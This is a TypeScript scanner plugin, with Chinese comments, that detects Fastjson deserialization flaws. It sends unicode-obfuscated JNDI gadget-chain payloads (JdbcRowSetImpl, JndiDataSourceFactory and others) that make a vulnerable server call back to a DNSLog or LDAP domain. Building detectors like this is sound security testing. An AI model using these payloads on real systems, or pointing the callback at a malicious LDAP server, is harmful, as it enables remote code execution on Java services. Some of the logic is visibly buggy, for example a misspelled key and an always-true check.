import { Fuzz, re, risk, str } from '@24wings/core';
import { pooledMap } from '@std/async/pool';

let highVersionPayload = [
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0069\u0062\u0061\u0074\u0069\u0073\u002E\u0064\u0061\u0074\u0061\u0073\u006F\u0075\u0072\u0063\u0065\u002E\u006A\u006E\u0064\u0069\u002E\u004A\u006E\u0064\u0069\u0044\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u0046\u0061\u0063\u0074\u006F\u0072\u0079","\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0069\u0065\u0073":{"\u0064\u0061\u0074\u0061\u005F\u0073\u006F\u0075\u0072\u0063\u0065":"{{params(reverseConnTarget)}}"}}}`,
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0078\u0062\u0065\u0061\u006E\u002E\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006F\u0072\u002E\u004A\u006E\u0064\u0069\u0043\u006F\u006E\u0076\u0065\u0072\u0074\u0065\u0072","\u0041\u0073\u0054\u0065\u0078\u0074":"{{params(reverseConnTarget)}}"}}`,
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0073\u0068\u0069\u0072\u006F\u002E\u006A\u006E\u0064\u0069\u002E\u004A\u006E\u0064\u0069\u004F\u0062\u006A\u0065\u0063\u0074\u0046\u0061\u0063\u0074\u006F\u0072\u0079","\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"{{params(reverseConnTarget)}}"}}`,
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u0062\u0072\u002E\u0063\u006F\u006D\u002E\u0061\u006E\u0074\u0065\u0072\u006F\u0073\u002E\u0064\u0062\u0063\u0070\u002E\u0041\u006E\u0074\u0065\u0072\u006F\u0073\u0044\u0042\u0043\u0050\u0043\u006F\u006E\u0066\u0069\u0067","\u006D\u0065\u0074\u0072\u0069\u0063\u0052\u0065\u0067\u0069\u0073\u0074\u0072\u0079":"{{params(reverseConnTarget)}}"}`,
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0069\u0067\u006E\u0069\u0074\u0065\u002E\u0063\u0061\u0063\u0068\u0065\u002E\u006A\u0074\u0061\u002E\u006A\u006E\u0064\u0069\u002E\u0043\u0061\u0063\u0068\u0065\u004A\u006E\u0064\u0069\u0054\u006D\u004C\u006F\u006F\u006B\u0075\u0070","\u006A\u006E\u0064\u0069\u004E\u0061\u006D\u0065\u0073":"{{params(reverseConnTarget)}}"}}}`,
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0069\u0062\u0061\u0074\u0069\u0073\u002E\u0073\u0071\u006C\u006D\u0061\u0070\u002E\u0065\u006E\u0067\u0069\u006E\u0065\u002E\u0074\u0072\u0061\u006E\u0073\u0061\u0063\u0074\u0069\u006F\u006E\u002E\u006A\u0074\u0061\u002E\u004A\u0074\u0061\u0054\u0072\u0061\u006E\u0073\u0061\u0063\u0074\u0069\u006F\u006E\u0043\u006F\u006E\u0066\u0069\u0067","\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0069\u0065\u0073":{"\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u0075\u0074\u0069\u006C\u002E\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0069\u0065\u0073","\u0055\u0073\u0065\u0072\u0054\u0072\u0061\u006E\u0073\u0061\u0063\u0074\u0069\u006F\u006E":"{{params(reverseConnTarget)}}"}}}`,
];
let dnslogPayloads = [
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006E\u0065\u0074\u002E\u0049\u006E\u0065\u0074\u0053\u006F\u0063\u006B\u0065\u0074\u0041\u0064\u0064\u0072\u0065\u0073\u0073"{"\u0061\u0064\u0064\u0072\u0065\u0073\u0073":,"\u0076\u0061\u006C":"{{params(reverseConnTarget)}}"}}}`,
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006E\u0065\u0074\u002E\u0049\u006E\u0065\u0074\u0034\u0041\u0064\u0064\u0072\u0065\u0073\u0073","\u0076\u0061\u006C":"{{params(reverseConnTarget)}}"}}`,
];
let nextPayload = [
  `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","\u0076\u0061\u006C":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"},"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C","\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"{{params(reverseConnTarget)}}","\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":true}}`,
  `{"\u0040\u0074\u0079\u0070\u0065":"[\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"[,,,{,,,"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"{{params(reverseConnTarget)}}", "\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":true}`,
];

let checkFastjsonVersion =
  `{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0041\u0075\u0074\u006f\u0043\u006c\u006f\u0073\u0065\u0061\u0062\u006c\u0065"}`;

export async function endpoint(request: Request) {
  const fuzz = new Fuzz(request);
  let bypassNextPayload = false;

  let resp = await fuzz.fuzzPostRaw(checkFastjsonVersion);

  let result = re.grok(await resp.text(), `fastjson-version %{COMMONVERSION:version}`)?.groups;
  let version: string = '';
  if (result) {
    version = result['verison'];
  }
  if (version) {
    console.log('探测到fastjson 版本为:', version);
    let [, , last] = version.split('.');
    if (Number(last) > 43) {
      bypassNextPayload = true;
    }
  }
  let middleRisk = await checkPayloads(dnslogPayloads, fuzz);
  // 如果不是高版本而且有Dnslog回显，那就测试低版本Payload
    if (middleRisk.filter((v) => v == true).length >= 0 && !bypassNextPayload) {
        let highRisk = await checkPayloads(nextPayload, fuzz);
        if (highRisk.filter(v=>v==true).length > 0) {
            console.log('高危')
        }
  }
    // 如果没有检测到利用链，继续测试高版本Payload
    let highRisk = await checkPayloads(highVersionPayload, fuzz);
    if (highRisk.filter(v => v == true).length > 0) {
        console.log('高危')
    }
  
}

async function checkPayloads(payloads: string[], fuzz: Fuzz) {
  let poolsize = payloads.length > 20 ? 20 : payloads.length;
  let pool = pooledMap(poolsize, payloads, async (payload) => {
    return await sendPayload(payload, true, fuzz);
  });
  return await Array.fromAsync(pool);
}

async function sendPayload(payload: string, isDnslog = true, fuzz: Fuzz): Promise<boolean> {
  let { domain, token } = await risk.newDNSLogDomain();
  let checkDomain = domain;
  if (isDnslog) {
    checkDomain = domain;
  } else {
    checkDomain = `ldap://${domain}/${str.generateRandomString(10)}`;
  }
  checkDomain = str.toUnicodeEscape(checkDomain);
  let payloadNew = str.stringsWithParam(payload, { 'reverseConnTarget': checkDomain });
  let resp = await fuzz.fuzzPostRaw(payloadNew, { headers: { 'content-type': 'application/json' } });

  let records = await risk.checkDNSLogByToken(token);
  if (records.length > 0) {
    console.log('又漏洞');
    return true;
  } else {
    return false;
  }
}
